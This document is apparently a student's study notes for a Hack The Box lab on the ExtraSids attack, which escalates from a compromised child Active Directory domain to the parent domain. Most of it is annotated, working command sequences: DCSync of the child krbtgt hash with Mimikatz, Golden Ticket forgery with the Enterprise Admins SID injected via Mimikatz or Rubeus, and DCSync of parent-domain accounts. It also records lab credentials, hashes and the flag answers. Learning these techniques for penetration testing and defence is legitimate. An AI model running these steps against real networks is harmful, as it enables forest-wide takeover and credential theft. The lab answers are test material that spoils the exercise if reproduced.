# Section 28 — Attacking Domain Trusts: Child → Parent (Windows)

> ExtraSids attack: compromise child domain → forge Golden Ticket with Enterprise Admin SID → own parent domain
> Performed from child domain machine: RDP with htb-student_adm / HTB_@cademy_stdnt_admin!

---

## QUICK REFERENCE

```powershell
# Step 1 — Get child domain SID
Import-Module .\PowerView.ps1
Get-DomainSID

# Step 2 — DCSync KRBTGT hash from child domain DC
cd C:\Tools\mimikatz\x64
.\mimikatz.exe
privilege::debug
lsadump::dcsync /user:LOGISTICS\krbtgt

# Step 3 — Get Enterprise Admins SID from parent domain
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select objectsid

# Step 4 — Forge Golden Ticket with ExtraSids (Mimikatz)
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<CHILD_SID> /krbtgt:<KRBTGT_HASH> /sids:<EA_SID> /ptt

# Step 5 — Verify ticket and access parent domain
klist
ls \\academy-ea-dc01.inlanefreight.local\c$
type \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt

# Alternative — Rubeus (outputs base64 ticket + injects with /ptt)
.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<CHILD_SID> /sids:<EA_SID> /user:hacker /ptt
```

---

## What is the ExtraSids Attack?

**The concept:** Within the same AD forest, SID Filtering is disabled by default. SID History is a legitimate migration feature — when a user moves from one domain to another, their old SID is added to the `sidHistory` attribute so they keep access to old resources.

**The abuse:** If we compromise a child domain, we can forge a Golden Ticket (fake TGT) for the child domain with an extra SID in the ticket — specifically the SID of the **Enterprise Admins** group from the parent domain. When we authenticate anywhere in the forest using this ticket, the parent domain's DC sees the Enterprise Admin SID in our token and treats us as a member of that group.

**Why it works:** SID Filtering (which would block this) is only enforced across **forest boundaries**, not within a forest. Parent-child trusts inside the same forest don't filter SIDs — this is by design. The fix would be to enable Selective Authentication, but almost no one does.

**Result:** Full Enterprise Admin access to the parent domain from a child domain compromise — one step up the chain to total forest control.

---

## Data Required for the Attack

| Piece | How to Get It | Lab Value |
|-------|--------------|-----------|
| Child domain FQDN | Known from enumeration | `LOGISTICS.INLANEFREIGHT.LOCAL` |
| Child domain SID | `Get-DomainSID` | `S-1-5-21-2806153819-209893948-922872689` |
| KRBTGT NT hash (child) | `lsadump::dcsync /user:LOGISTICS\krbtgt` | `9d765b482771505cbe97411065964d5f` |
| Target username | Any name — can be fake | `hacker` |
| Enterprise Admins SID | `Get-DomainGroup -Domain PARENT` | `S-1-5-21-3842939050-3880317879-2865463114-519` |

---

## Full Attack Walkthrough

### Step 1 — Verify no access to parent domain (baseline)

```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
# Expected: "Access is denied"
# This confirms we are currently a child domain user with no parent domain rights
# We run this before and after the attack to prove the escalation worked
```

### Step 2 — Get the child domain SID

```powershell
cd C:\Tools
Import-Module .\PowerView.ps1
# Load PowerView so Get-DomainSID is available
```

```powershell
Get-DomainSID
# Returns the SID of the domain the current machine is joined to
# This is the child domain SID — needed as the /sid parameter in Mimikatz
# Lab result: S-1-5-21-2806153819-209893948-922872689
# Note: the child domain SID is also visible in Mimikatz dcsync output (Object Security ID line)
```

### Step 3 — DCSync the KRBTGT hash from the child domain

```powershell
cd C:\Tools\mimikatz\x64
.\mimikatz.exe
# Navigate to the x64 version — the Win32 version will fail on 64-bit systems
```

```
privilege::debug
# Request SeDebugPrivilege — required before any lsadump command
# Without this, Mimikatz cannot access LSASS memory or perform DCSync
```

```
lsadump::dcsync /user:LOGISTICS\krbtgt
# dcsync = mimic a DC requesting replication from another DC — same mechanism as Section 22
# /user:LOGISTICS\krbtgt = target the KRBTGT service account in the LOGISTICS child domain
# KRBTGT is the account that signs/encrypts ALL Kerberos tickets in a domain
# Its NT hash is the key material we need to forge Golden Tickets for this domain
# Look for: "Hash NTLM: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" under Credentials
# Lab result: 9d765b482771505cbe97411065964d5f
```

### Step 4 — Get the Enterprise Admins SID from the parent domain

```powershell
# Exit Mimikatz first, or open a new PowerShell window with PowerView loaded
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select objectsid
# -Domain INLANEFREIGHT.LOCAL = query the PARENT domain (not the child we're currently in)
# This works because of the bidirectional trust — our child domain creds are accepted there
# -Identity "Enterprise Admins" = look up this specific group
# select objectsid = just show the SID, not the full group object
# Enterprise Admins only exists in the forest root domain — it controls the entire forest
# Lab result: S-1-5-21-3842939050-3880317879-2865463114-519
# The -519 RID at the end is always the Enterprise Admins group — consistent across all domains
```

### Step 5 — Forge the Golden Ticket with ExtraSids (Mimikatz)

```
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

Each parameter explained:
```
/user:hacker
# The username to embed in the ticket — can be completely fake, does not need to exist in AD
# The parent DC will see the Enterprise Admin SID in the token regardless of the username

/domain:LOGISTICS.INLANEFREIGHT.LOCAL
# The child domain this ticket is issued for
# Must match the domain the KRBTGT hash belongs to

/sid:S-1-5-21-2806153819-209893948-922872689
# The SID of the child domain
# Used to build the correct SID for the fake user (domain SID + user RID)

/krbtgt:9d765b482771505cbe97411065964d5f
# The NT hash of the KRBTGT account from the CHILD domain
# This is the signing key — the ticket is valid anywhere that trusts this domain's KRBTGT
# Mimikatz uses this as /krbtgt; Rubeus uses /rc4 for the same value

/sids:S-1-5-21-3842939050-3880317879-2865463114-519
# THE KEY PARAMETER — the ExtraSids value
# This injects the Enterprise Admins SID from the PARENT domain into the ticket's PAC
# When the parent domain's DC validates this ticket, it sees EA membership and grants full access
# -519 = Enterprise Admins RID (always the same across all AD installations)

/ptt
# Pass-the-Ticket — inject the forged ticket directly into the current session's memory
# Without /ptt, Mimikatz saves the ticket as a .kirbi file on disk instead
# After /ptt the ticket is active immediately — no need to import separately
```

### Step 6 — Verify ticket is in memory

```powershell
klist
# List all Kerberos tickets currently cached in the session
# Should show: Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
# Cache Flags: 0x1 -> PRIMARY = this is an active TGT, not just a service ticket
# Renew Time 10 years out = Golden Ticket (real tickets expire in ~10 hours)
```

### Step 7 — Access parent domain and read flag

```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
# Try accessing the C: drive of the parent DC via SMB
# If the ExtraSids attack worked, this will now list the DC's filesystem
# Previously got "Access is denied" — now we're in as Enterprise Admin
```

```powershell
type \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
# type = PowerShell alias for Get-Content — read the flag file
# Full UNC path required — no cd across SMB shares in this context
# Lab result: f@ll1ng_l1k3_d0m1no3$
```

---

## Alternative — Rubeus

```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
# /rc4 = same KRBTGT NT hash — Rubeus uses /rc4 where Mimikatz uses /krbtgt
# /sids = same Enterprise Admins SID injected as ExtraSid
# /ptt = inject ticket into memory (same as Mimikatz)
# Rubeus also outputs a base64-encoded .kirbi blob — save it if you need to use the ticket elsewhere
```

After Rubeus injection, use the same `klist` → `ls \\DC\c$` verification steps.

---

## Follow-on: DCSync the Parent Domain

Once the ticket is injected, we can DCSync any user in the parent domain:

```
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
# /domain:INLANEFREIGHT.LOCAL = explicitly target the parent domain's DC for replication
# Required when your current session is in a DIFFERENT domain than the target user
# Without /domain, Mimikatz will try to DCSync from your local domain's DC and fail
# Lab result: lab_adm NT hash = 663715a1a8b957e8e9943cc98ea451b6
```

---

## Lab Answers

| Question | Answer |
|----------|--------|
| Child domain SID | `S-1-5-21-2806153819-209893948-922872689` |
| Enterprise Admins SID (root domain) | `S-1-5-21-3842939050-3880317879-2865463114-519` |
| Flag at C:\ExtraSids\flag.txt on parent DC | `f@ll1ng_l1k3_d0m1no3$` |

---

## Exam Notes

- ExtraSids = Golden Ticket + extra SID injected = SID Filtering bypass within same forest
- SID Filtering is OFF by default within a forest — only enforced across forest boundaries
- Enterprise Admins SID always ends in `-519` — consistent across all AD environments
- `/sids` in Mimikatz / Rubeus = the ExtraSids parameter — this is what makes it cross-domain
- KRBTGT hash from child domain = the only key you need — user doesn't need to exist
- Golden Ticket Renew Time 10 years out = giveaway in logs — defenders watch for this
- `/domain:PARENT.LOCAL` in Mimikatz dcsync = required when targeting a domain different from your session
- After ExtraSids: DCSync parent domain for administrator/krbtgt hash → full forest persistence
- Mimikatz path on HTB lab machines: `C:\Tools\mimikatz\x64\mimikatz.exe`
- Always run `privilege::debug` before any lsadump command in Mimikatz — it will fail silently otherwise
- `klist` = verify ticket is injected; look for Cache Flags: 0x1 -> PRIMARY = active TGT
